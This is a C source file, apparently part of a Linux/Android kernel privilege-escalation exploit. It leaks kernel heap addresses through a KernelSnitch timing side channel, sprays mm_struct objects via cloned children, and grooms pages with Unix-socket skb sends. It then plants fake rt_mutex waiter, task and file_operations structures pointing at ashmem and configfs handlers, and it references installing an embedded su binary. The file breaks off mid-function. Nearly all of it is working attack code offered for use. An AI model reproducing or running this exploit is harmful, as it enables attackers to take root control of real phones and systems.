#include "common.h"
#include "kernelsnitch/kernelsnitch.h"
#include <poll.h>

static void slide_report_exit(const char *which, int status) {
  char buf[96];
  int n = 0;
  const char *p = "[!] EXIT-INTERPOSED ";
  while (p[n] && n < 20) {
    buf[n] = p[n];
    n++;
  }
  int m = 0;
  while (which[m] && n < 40) {
    buf[n++] = which[m++];
  }
  buf[n++] = ' ';
  long pid = syscall(SYS_getpid);
  long tid = syscall(SYS_gettid);
  m = 0;
  char tmp[24];
  long v = pid;
  do {
    tmp[m++] = (char)('0' + (v % 10));
    v /= 10;
  } while (v);
  while (m && n < 60) {
    buf[n++] = tmp[--m];
  }
  buf[n++] = '/';
  v = tid;
  m = 0;
  do {
    tmp[m++] = (char)('0' + (v % 10));
    v /= 10;
  } while (v);
  while (m && n < 70) {
    buf[n++] = tmp[--m];
  }
  buf[n++] = ' ';
  v = status;
  m = 0;
  if (v < 0) {
    buf[n++] = '-';
    v = -v;
  }
  do {
    tmp[m++] = (char)('0' + (v % 10));
    v /= 10;
  } while (v);
  while (m && n < 88) {
    buf[n++] = tmp[--m];
  }
  buf[n++] = '\n';
  write(2, buf, n);
}

void exit(int status) {
  slide_report_exit("exit", status);
  syscall(SYS_exit_group, status & 0xff);
  for (;;) {
  }
}

void _exit(int status) {
  slide_report_exit("_exit", status);
  syscall(SYS_exit_group, status & 0xff);
  for (;;) {
  }
}

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[SKB_RECLAIM_SENDS][2] = {
    {-1, -1},
    {-1, -1},
    {-1, -1},
    {-1, -1},
};
_Static_assert(SKB_RECLAIM_SENDS == 4, "reclaim_sv initializer count");
static int g_payload_peek_fd = -1;
#define FRAME_ORACLE_SPRAY_MAX 4
static unsigned char *frame_oracle_spray[FRAME_ORACLE_SPRAY_MAX];
static size_t frame_oracle_spray_len[FRAME_ORACLE_SPRAY_MAX];
static int frame_oracle_spray_n;
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";

static long gl_cpu_count_onln = -1;
static char gl_cpu_online_txt[64] = "unreadable";

void gl_pre_cache_cpuinfo(void) {
  char txt[64] = "unreadable";
  long n;
  if (gl_cpu_count_onln > 0) {
    return;
  }
  read_first_line("/sys/devices/system/cpu/online", txt, sizeof(txt));
  n = sysconf(_SC_NPROCESSORS_ONLN);
  if (n < 1) {
    n = 1;
  }
  memcpy(gl_cpu_online_txt, txt, sizeof(gl_cpu_online_txt));
  gl_cpu_count_onln = n;
  pr_info("v141 cpu pre-cache onln=%ld online=%s\n", n, gl_cpu_online_txt);
}

long gl_get_cpu_count(void) {
  long n = gl_cpu_count_onln;
  if (n > 0) {
    return n;
  }
  n = sysconf(_SC_NPROCESSORS_ONLN);
  return n < 1 ? 1 : n;
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)gl_get_cpu_count();
  ks = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
                          0, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) { kernelsnitch_bruteforce(ks); }

uintptr_t current_kernelsnitch_mm_struct(void) { return ks->mm_struct; }

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak)) int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits),
               "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s",
               values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s "
             "enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr, enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d version=%s label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VERSION, BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) { return; }

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) && try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

static volatile int g_fops_armed;

void util_mark_fops_armed(const char *why) {
  if (g_fops_armed) {
    return;
  }
  g_fops_armed = 1;
  pr_warning("v113 slot-armed: %s -> every later ashmem open is gated by "
             "the frame oracle\n",
             why ? why : "-");
}

int util_fops_armed(void) { return g_fops_armed; }

int open_ashmem_device(void) {
  if (g_fops_armed && env_flag("SLIDE_FRAME_GUARD_ORACLE", 1)) {
    int owned = util_frame_oracle("open-gate");
    if (owned != 1) {
      pr_warning("v113 open-gate: oracle=%d -> refuse openat(%s) "
                 "(slot armed with an unproven frame)\n",
                 owned, ashmem_path);
      errno = EPERM;
      return -1;
    }
  }
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) { return p0_data_alias(image_addr); }

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) { return text_addr(image_addr); }

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF, fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 && try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    for (int j = 0; j < 2; j++) {
      if (reclaim_sv[i][j] >= 0) {
        close(reclaim_sv[i][j]);
        reclaim_sv[i][j] = -1;
      }
    }
  }
}

void util_set_oom_protect(void) {
  int fd = open("/proc/self/oom_score_adj", O_WRONLY);
  if (fd < 0) {
    return;
  }
  ssize_t w = write(fd, "-1000", 5);
  (void)w;
  close(fd);
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    fake_parent = fake_fops;
    fake_right = data_addr(ASHMEM_MISC_FOPS);
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
  uintptr_t write_left = 0;
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_LOGGERS_0_1;
    write_right = 0;
    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, 0);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
    put32(p, W0_OFF + FAKE_WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    put_fake_fops_table(p, FOPS_TABLE_OFF);
  }
  return 1;
}

static int v116_canary_go[2] = {-1, -1};
static int v116_canary_done[2] = {-1, -1};
static pthread_t v116_canary_thread;
static int v116_canary_thread_started;
static int v116_canary_desync;

static void *v116_i1_canary_thread(void *arg) {
  (void)arg;
  pin_to_core(CORE);
  unsigned char *cbuf = malloc(SKB_SEND_SIZE);
  static const unsigned char v116_canary_nonce[8] = {0x11, 0x66, 0x11, 0x66,
                                                     0x11, 0x66, 0x11, 0x66};
  if (cbuf) {
    memset(cbuf, 0, SKB_SEND_SIZE);
  }
  for (;;) {
    char go = 0;
    if (read(v116_canary_go[0], &go, 1) != 1) {
      break;
    }
    int sv[2] = {-1, -1};
    int ready = 0;
    if (cbuf && socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0) {
      int sndbuf = 1 << 20;
      setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
      int fl = fcntl(sv[0], F_GETFL, 0);
      if (fl >= 0) {
        fcntl(sv[0], F_SETFL, fl | O_NONBLOCK);
      }
      memcpy(cbuf, skb_buf, SKB_SEND_SIZE);
      memcpy(cbuf, v116_canary_nonce, sizeof(v116_canary_nonce));
      ready = 1;
    }
    if (!ready) {
      pr_warning("v116 I1 canary setup failed buf=%p sv=%d,%d\n", cbuf, sv[0],
                 sv[1]);
    } else {
      struct iovec ciov;
      struct msghdr cmsg;
      unsigned char peek64[64];
      memset(&ciov, 0, sizeof(ciov));
      memset(&cmsg, 0, sizeof(cmsg));
      memset(peek64, 0, sizeof(peek64));
      ciov.iov_base = cbuf;
      ciov.iov_len = SKB_SEND_SIZE;
      cmsg.msg_iov = &ciov;
      cmsg.msg_iovlen = 1;
      errno = 0;
      (void)sendmsg(sv[0], &cmsg, MSG_DONTWAIT);
      errno = 0;
      (void)recv(sv[1], peek64, sizeof(peek64), MSG_PEEK | MSG_DONTWAIT);
    }
    if (sv[0] >= 0) {
      close(sv[0]);
    }
    if (sv[1] >= 0) {
      close(sv[1]);
    }
    char done = 1;
    if (write(v116_canary_done[1], &done, 1) != 1) {
      break;
    }
  }
  free(cbuf);
  return NULL;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)gl_get_cpu_count();
  ks = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
                          0, 0);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  int warm_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, warm_sv));
  size_t warm_sz = (size_t)(-SKB_DATA_DELTA);
  unsigned char warm_buf[4096];
  memset(warm_buf, 0x5A, sizeof(warm_buf));
  for (int w = 0; w < 32; w++) {
    SYSCHK(write(warm_sv[0], warm_buf, warm_sz));
    SYSCHK(read(warm_sv[1], warm_buf, warm_sz));
  }
  SYSCHK(close(warm_sv[0]));
  SYSCHK(close(warm_sv[1]));
  if (!v116_canary_thread_started && env_flag("SLIDE_V116_I1", 1)) {
    if (pipe(v116_canary_go) == 0 && pipe(v116_canary_done) == 0) {
      pthread_attr_t cattr;
      pthread_attr_init(&cattr);
      pthread_attr_setstacksize(&cattr, 65536);
      if (pthread_create(&v116_canary_thread, &cattr, v116_i1_canary_thread,
                         NULL) == 0) {
        v116_canary_thread_started = 1;
      } else {
        pr_warning("v116 I1 canary pthread_create failed\n");
      }
      pthread_attr_destroy(&cattr);
    } else {
      pr_warning("v116 I1 canary pipes failed errno=%d\n", errno);
    }
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  SYSCHK(waitpid(child_leak, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  if (!prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  int sndbuf = 1 << 20;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv[i]));
    setsockopt(reclaim_sv[i][0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
               sizeof(sndbuf));
    int reclaim_flags = fcntl(reclaim_sv[i][0], F_GETFL, 0);
    if (reclaim_flags >= 0) {
      fcntl(reclaim_sv[i][0], F_SETFL, reclaim_flags | O_NONBLOCK);
    }
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  if (v116_canary_thread_started && !v116_canary_desync &&
      env_flag("SLIDE_V116_I1", 1)) {
    char go = 1;
    if (write(v116_canary_go[1], &go, 1) == 1) {
      struct pollfd pfd;
      memset(&pfd, 0, sizeof(pfd));
      pfd.fd = v116_canary_done[0];
      pfd.events = POLLIN;
      int pr = poll(&pfd, 1, 2000);
      char done;
      if (pr == 1 && read(v116_canary_done[0], &done, 1) == 1) {
      } else {
        v116_canary_desync = 1;
        pr_warning("v116 I1 canary handshake timeout pr=%d errno=%d\n", pr,
                   errno);
      }
    } else {
      v116_canary_desync = 1;
      pr_warning("v116 I1 canary go write failed errno=%d\n", errno);
    }
  }

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
  pr_info("v115 P1 capture send cpu=%d\n", sched_getcpu());
  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  int hold_skb =
      env_flag("PAGE_HOLD_SKB", 0) || env_flag("SLIDE_PAGE_HOLD_SKB", 0);
  if (hold_skb) {
    g_payload_peek_fd = pcp_shaping_sv[1];
  } else {
    SYSCHK(close(pcp_shaping_sv[1]));
  }
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    sendmsg(reclaim_sv[i][0], &msg, MSG_DONTWAIT);
  }
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
